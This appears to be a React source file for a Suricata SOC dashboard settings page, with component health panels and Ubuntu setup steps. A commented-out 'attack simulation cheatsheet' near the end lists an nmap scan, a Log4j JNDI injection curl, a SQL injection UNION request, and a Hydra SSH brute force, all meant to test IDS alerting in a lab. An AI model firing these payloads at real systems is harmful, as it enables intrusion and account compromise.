import React, { useState, useEffect } from 'react';
import { ApiService } from '../services/api.ts';
import { SystemStatusResponse } from '../types.ts';
import {
  Server,
  Database,
  Terminal,
  Shield,
  CheckCircle,
  AlertTriangle,
  RefreshCw,
  Copy,
  Check,
  Settings as SettingsIcon,
} from 'lucide-react';

export const SettingsPage: React.FC = () => {
  const [status, setStatus] = useState<SystemStatusResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Client preferences
  const [audioAlerts, setAudioAlerts] = useState<boolean>(() => {
    return localStorage.getItem('suricata_audio_alerts') === 'true';
  });
  const [bufferLimit, setBufferLimit] = useState<number>(() => {
    return Number(localStorage.getItem('suricata_buffer_limit')) || 100;
  });

  const loadStatus = () => {
    setLoading(true);
    ApiService.fetchStatus()
      .then(setStatus)
      .catch((err) => console.error('Error fetching system status:', err))
      .finally(() => setLoading(false));
  };

  useEffect(() => {
    loadStatus();
  }, []);

  const handleToggleAudio = () => {
    const next = !audioAlerts;
    setAudioAlerts(next);
    localStorage.setItem('suricata_audio_alerts', String(next));
  };

  const handleBufferLimitChange = (val: number) => {
    setBufferLimit(val);
    localStorage.setItem('suricata_buffer_limit', String(val));
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const reader = status?.suricata;
  const db = status?.database;

  return (
    <div className="space-y-8 max-w-5xl mx-auto pb-12">
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 pb-2 border-b border-[#1E293B]">
        <div>
          <h1 className="text-xl font-bold text-slate-100 font-mono tracking-tight">System Status & Lab Configuration</h1>
          <p className="text-xs text-slate-400 mt-0.5">
            Diagnostic telemetry, Suricata host integration, and authorized Kali Linux test recipes
          </p>
        </div>

        <button
          onClick={loadStatus}
          className="flex items-center gap-1.5 px-3 py-1.5 bg-[#1E293B] hover:bg-[#334155] rounded-md text-xs font-mono text-slate-200 transition-colors"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin text-indigo-400' : ''}`} />
          <span>Refresh Diagnostics</span>
        </button>
      </div>

      {/* 1. Component Health Diagnostics */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* Suricata Log Reader Status */}
        <div className="p-5 bg-gradient-to-br from-[#202020] via-[#101010] to-[#030303] border border-[#303030] rounded-lg space-y-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.05)]">
          <div className="flex items-center justify-between pb-3 border-b border-[#1E293B]">
            <div className="flex items-center gap-2">
              <Server className="w-4 h-4 text-indigo-400" />
              <h2 className="text-sm font-semibold text-slate-100">Suricata Log Ingestion Service</h2>
            </div>
            <span
              className={`text-xs px-2 py-0.5 rounded font-mono font-medium border ${
                reader?.active
                  ? 'bg-emerald-950/60 text-emerald-300 border-emerald-800'
                  : 'bg-rose-950/60 text-rose-300 border-rose-800'
              }`}
            >
              {reader?.active ? 'ACTIVE' : 'INACTIVE'}
            </span>
          </div>

          <div className="space-y-2 text-xs font-mono">
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Configured Path (SURICATA_EVE_PATH):</span>
              <span className="text-slate-200 truncate max-w-[220px]" title={reader?.resolvedPath}>
                {reader?.filePath || '/var/log/suricata/eve.json'}
              </span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>File Exists on Disk:</span>
              <span className={reader?.fileExists ? 'text-emerald-400' : 'text-amber-400'}>
                {reader?.fileExists ? 'YES (Live File Followed)' : 'NO (Using Resilient Sample Baseline)'}
              </span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Ingestion Engine Mode:</span>
              <span className="text-indigo-300 uppercase">{reader?.mode || 'LIVE'}</span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Total Events Ingested:</span>
              <span className="text-slate-200">{reader?.eventsReadCount.toLocaleString() ?? 0}</span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Total Alerts Ingested:</span>
              <span className="text-amber-400 font-bold">{reader?.alertsReadCount.toLocaleString() ?? 0}</span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Last Ingested Event:</span>
              <span className="text-slate-300 truncate max-w-[200px]">
                {reader?.lastEventTime ? new Date(reader.lastEventTime).toLocaleTimeString() : 'Awaiting traffic'}
              </span>
            </div>
            <div className="flex justify-between py-1 text-slate-400">
              <span>Enforcement Mode:</span>
              <span className={reader?.enforcementVerified ? 'text-rose-400' : 'text-slate-300'}>
                {reader?.deploymentMode === 'ips' ? 'IPS Mode (Inline Drops Observed)' : 'IDS Mode (Passive Sniffer)'}
              </span>
            </div>
          </div>
        </div>

        {/* Database Health Status */}
        <div className="p-5 bg-gradient-to-br from-[#202020] via-[#101010] to-[#030303] border border-[#303030] rounded-lg space-y-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.05)]">
          <div className="flex items-center justify-between pb-3 border-b border-[#1E293B]">
            <div className="flex items-center gap-2">
              <Database className="w-4 h-4 text-emerald-400" />
              <h2 className="text-sm font-semibold text-slate-100">Live Stream Buffer (Zero-DB Architecture)</h2>
            </div>
            <span className="text-xs px-2 py-0.5 rounded font-mono font-medium border bg-emerald-950/60 text-emerald-300 border-emerald-800">
              STREAM BUFFER ACTIVE
            </span>
          </div>

          <div className="space-y-2 text-xs font-mono">
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Buffer Architecture:</span>
              <span className="text-slate-200">
                In-Memory Real-Time Ring Buffer (No MongoDB required)
              </span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Retention Capacity:</span>
              <span className="text-slate-300">
                Last 3,000 logs in memory
              </span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Logs in Buffer:</span>
              <span className="text-slate-200 font-bold">{db?.totalEvents ?? 0}</span>
            </div>
            <div className="flex justify-between py-1 border-b border-[#1E293B]/60 text-slate-400">
              <span>Alerts in Buffer:</span>
              <span className="text-amber-400 font-bold">{db?.totalAlerts ?? 0}</span>
            </div>
            <div className="flex justify-between py-1 text-slate-400">
              <span>Database Dependency:</span>
              <span className="text-emerald-400 font-medium">
                None (Pure file-tail + WebSocket streaming)
              </span>
            </div>
          </div>
        </div>
      </div>     

      {/* 2. Ubuntu Virtual Machine Setup Guide */}
      <div className="p-5 bg-gradient-to-br from-[#202020] via-[#101010] to-[#030303] border border-[#303030] rounded-lg space-y-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.05)]">
        <div className="flex items-center gap-2 pb-3 border-b border-[#1E293B]">
          <Terminal className="w-4 h-4 text-amber-400" />
          <h2 className="text-sm font-semibold text-slate-100">Ubuntu Virtual Machine Suricata Setup Guide</h2>
        </div>

        <p className="text-xs text-slate-300 leading-relaxed">
          Follow these steps on your Ubuntu VM hosting Suricata. Never run Node.js as root solely to read Suricata logs.
        </p>

        <div className="space-y-4 text-xs font-mono">
          {/* Step 1 */}
          <div className="p-3 bg-gradient-to-br from-[#151515] via-[#0B0B0B] to-[#030303] border border-[#303030] rounded-md space-y-1.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
            <div className="flex items-center justify-between text-slate-400 font-sans font-semibold">
              <span>1. Install Suricata & Community Emerging Threats (ET) Rules</span>
              <button
                onClick={() =>
                  copyToClipboard(
                    'sudo apt update && sudo apt install -y suricata jq\nsudo suricata-update',
                    'step1'
                  )
                }
                className="text-slate-400 hover:text-white"
              >
                {copiedId === 'step1' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
            <pre className="text-indigo-300">
              sudo apt update && sudo apt install -y suricata jq{'\n'}
              sudo suricata-update
            </pre>
          </div>

          {/* Step 2 */}
          <div className="p-3 bg-gradient-to-br from-[#151515] via-[#0B0B0B] to-[#030303] border border-[#303030] rounded-md space-y-1.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
            <div className="flex items-center justify-between text-slate-400 font-sans font-semibold">
              <span>2. Identify Real Network Interface (Do NOT assume eth0)</span>
              <button
                onClick={() => copyToClipboard('ip -brief address show\n# or: ip link show', 'step2')}
                className="text-slate-400 hover:text-white"
              >
                {copiedId === 'step2' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
            <pre className="text-indigo-300">
              ip -brief address show{'\n'}
              # Note interface name (e.g. ens33, enp0s3, or eth0)
            </pre>
          </div>

          {/* Step 3 */}
          <div className="p-3 bg-gradient-to-br from-[#151515] via-[#0B0B0B] to-[#030303] border border-[#303030] rounded-md space-y-1.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
            <div className="flex items-center justify-between text-slate-400 font-sans font-semibold">
              <span>3. Configure Safe Non-Root Permissions for eve.json</span>
              <button
                onClick={() =>
                  copyToClipboard(
                    '# Create suricata group access for current node user\nsudo chmod 755 /var/log/suricata\nsudo chmod 644 /var/log/suricata/eve.json 2>/dev/null || true',
                    'step3'
                  )
                }
                className="text-slate-400 hover:text-white"
              >
                {copiedId === 'step3' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
            <pre className="text-indigo-300">
              sudo chmod 755 /var/log/suricata{'\n'}
              sudo chmod 644 /var/log/suricata/eve.json
            </pre>
          </div>

          {/* Step 4 */}
          <div className="p-3 bg-gradient-to-br from-[#151515] via-[#0B0B0B] to-[#030303] border border-[#303030] rounded-md space-y-1.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
            <div className="flex items-center justify-between text-slate-400 font-sans font-semibold">
              <span>4. Launch Suricata Engine in IDS Sniffer Mode</span>
              <button
                onClick={() =>
                  copyToClipboard(
                    'sudo suricata -c /etc/suricata/suricata.yaml -i <YOUR_INTERFACE> -D',
                    'step4'
                  )
                }
                className="text-slate-400 hover:text-white"
              >
                {copiedId === 'step4' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
            <pre className="text-indigo-300">
              sudo suricata -c /etc/suricata/suricata.yaml -i ens33 -D
            </pre>
          </div>
        </div>
      </div>

      {/* 4. Kali Linux Authorized Traffic Simulation Recipes
      <div className="p-5 bg-[#0F172A] border border-[#1E293B] rounded-lg space-y-4">
        <div className="flex items-center gap-2 pb-3 border-b border-[#1E293B]">
          <Shield className="w-4 h-4 text-rose-400" />
          <h2 className="text-sm font-semibold text-slate-100">Authorized Kali Linux Attack Simulation Cheatsheet</h2>
        </div>

        <p className="text-xs text-slate-300 leading-relaxed">
          Execute these test commands exclusively against your authorized lab VM target to verify live alert ingestion into the SOC dashboard:
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
          <div className="p-3 bg-[#06090F] border border-[#1E293B] rounded-md space-y-1">
            <div className="font-sans font-semibold text-slate-300">Nmap Stealth SYN Port Scan</div>
            <pre className="text-amber-300 text-[11px]">nmap -sS -sV -p 80,443,22 &lt;TARGET_IP&gt;</pre>
          </div>

          <div className="p-3 bg-[#06090F] border border-[#1E293B] rounded-md space-y-1">
            <div className="font-sans font-semibold text-slate-300">Log4j RCE Trigger (CVE-2021-44228)</div>
            <pre className="text-rose-400 text-[11px]">
              curl -A '${'{jndi:ldap://127.0.0.1:1389/Exploit}'}' http://&lt;TARGET_IP&gt;/
            </pre>
          </div>

          <div className="p-3 bg-[#06090F] border border-[#1E293B] rounded-md space-y-1">
            <div className="font-sans font-semibold text-slate-300">SQL Injection Pattern Test</div>
            <pre className="text-amber-300 text-[11px]">
              curl 'http://&lt;TARGET_IP&gt;/products?id=1%20UNION%20SELECT%201,2,3--'
            </pre>
          </div>

          <div className="p-3 bg-[#06090F] border border-[#1E293B] rounded-md space-y-1">
            <div className="font-sans font-semibold text-slate-300">Hydra SSH Brute Force Attempt</div>
            <pre className="text-rose-400 text-[11px]">
              hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET_IP&gt;
            </pre>
          </div>
        </div>
      </div> */}
    </div>
  );
};
